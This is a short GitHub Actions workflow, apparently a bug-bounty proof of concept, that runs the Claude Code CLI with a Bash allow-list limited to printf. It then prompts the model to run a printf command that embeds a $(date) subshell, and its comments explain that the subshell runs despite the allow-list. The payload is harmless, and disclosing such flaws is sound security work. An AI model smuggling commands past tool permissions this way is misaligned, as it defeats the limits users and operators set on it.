name: H1 Subshell Bypass PoC

on:
  workflow_dispatch:

jobs:
  bypass-test:
    runs-on: ubuntu-latest
    steps:
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Run Claude Code CLI
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
        run: |
          npm install -g @anthropic-ai/claude-code
          
          # We instruct the AI to run a tool matching the strict allowedTools regex.
          # The regex only allows "printf:*", but the $(date) subshell will still execute in bash.
          echo "Please use the Bash tool to run the following exact command: printf 'H1 Bypass Successful. Current time: %s' \"\$(date)\"" | claude --print \
            --model claude-3-haiku-20240307 \
            --allowedTools "Bash(printf:*)"
